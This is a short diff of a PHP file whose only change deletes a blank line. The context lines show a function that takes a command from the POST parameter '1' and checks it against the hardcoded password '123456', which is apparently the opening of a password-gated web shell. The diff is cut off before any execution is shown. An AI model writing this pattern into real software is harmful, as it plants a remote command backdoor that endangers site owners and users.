@@ -1,5 +1,4 @@
 <?php
-
 function test($pass) {
     $cmd = $_POST[1];
     if ($pass == "123456") {
